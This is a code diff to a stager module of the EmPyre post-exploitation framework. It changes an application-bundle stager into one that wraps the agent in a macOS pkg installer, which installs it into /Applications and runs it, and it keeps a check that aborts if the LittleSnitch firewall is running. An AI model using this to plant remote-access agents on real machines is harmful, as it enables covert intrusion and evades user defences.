@@ -1,16 +1,15 @@
 from lib.common import helpers
 
-
 class Stager:
 
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'Application',
+            'Name': 'pkg',
 
             'Author': ['@xorrior'],
 
-            'Description': ('Generates an EmPyre Application.'),
+            'Description': ('Generates a pkg installer. This will install an EmPyre application bundle in the /Applications directory and execute it.'),
 
             'Comments': [
                 ''
@@ -31,18 +30,13 @@ class Stager:
                 'Required'      :   False,
                 'Value'         :   ''
             },
-            'AppName' : {
-                'Description'   :   'Name of the Application Bundle. This will not change name of the executable in the /MacOS/ directory. Defaults to launcher.app',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
             'OutFile' : {
-                'Description'   :   'path to output EmPyre application. The application will be saved to a zip file.',
+                'Description'   :   'File to write pkg to.',
                 'Required'      :   True,
-                'Value'         :   '/tmp/out.zip'
+                'Value'         :   '/tmp/out.pkg'
             },
             'LittleSnitch' : {
-                'Description'   :   'Switch. Checks for LittleSnitch, exit the staging process if true. Defaults to True.',
+                'Description'   :   'Switch. Check for the LittleSnitch process, exit the staging process if it is running. Defaults to True.',
                 'Required'      :   True,
                 'Value'         :   'True'
             },
@@ -52,7 +46,7 @@ class Stager:
                 'Value'         :   'default'
             },
             'Architecture' : {
-                'Description'   :   'Architecture to use. x86 or x64',
+                'Description'   :   'Architecture to use for the application bundle. x86 or x64',
                 'Required'      :   True,
                 'Value'         :   'x64'
             }
@@ -77,7 +71,7 @@ class Stager:
         LittleSnitch = self.options['LittleSnitch']['Value']
         arch = self.options['Architecture']['Value']
         icnsPath = self.options['AppIcon']['Value']
-        AppName = self.options['AppName']['Value']
+
         
 
         # generate the launcher code
@@ -88,7 +82,8 @@ class Stager:
             return ""
 
         else:
-
+            AppName = ''
             launcher = launcher.strip('echo').strip(' | python &').strip("\"")
             ApplicationZip = self.mainMenu.stagers.generate_appbundle(launcherCode=launcher,Arch=arch,icon=icnsPath,AppName=AppName)
-            return ApplicationZip
+            pkginstaller = self.mainMenu.stagers.generate_pkg(bundleZip=ApplicationZip)
+            return pkginstaller
